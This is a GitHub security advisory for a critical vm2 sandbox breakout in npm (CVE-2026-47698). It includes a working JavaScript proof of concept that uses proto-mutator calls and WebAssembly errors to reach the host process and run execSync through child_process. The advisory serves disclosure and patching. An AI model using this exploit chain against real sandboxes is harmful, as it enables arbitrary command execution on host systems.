# [C] vm2: Sandbox Breakout Using Dangerous Host Proto Mutators

## Summary
Severity: Critical
Advisory: GHSA-cfcw-xp6x-25gj
CVE: CVE-2026-47698
CWE: CWE-913
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-cfcw-xp6x-25gj
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.6

## Details
### Summary

VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

### Details

The fix for https://github.com/patriksimek/vm2/security/advisories/GHSA-v6mx-mf47-r5wg is insufficient and can be bypassed by replacing `indirectcall.call(dangerousmutator, ...)` with `indirectcall.call(indirectcall, dangerousmutator, ...)` since indirect calls are not seen as dangerous.

### PoC

```js
const {VM} = require(".");
const vm = new VM();
console.log(vm.run(`
const getProto = Buffer.call.call(Buffer.call, {}.__lookupGetter__, Buffer, "__proto__");
const setProto = Buffer.call.call(Buffer.call, {}.__lookupSetter__, Buffer, "__proto__");

async function f() {
  try {
    await WebAssembly.compileStreaming();
  } catch(e) {
    Buffer.call.call(Buffer.call, setProto, Buffer.call.call(Buffer.call, getProto, e), null);
  }

  try {
    await WebAssembly.compileStreaming();
  } catch(e) {
    e.constructor.constructor("return process")().mainModule.require('child_process').execSync('touch pwned');
  }
}

f();
`));
```

### Impact

Attackers can perform Remote Code Execution under the assumption that the attacker can run arbitrary code execution inside the context of a vm2 sandbox.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-cfcw-xp6x-25gj
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/3.11.6
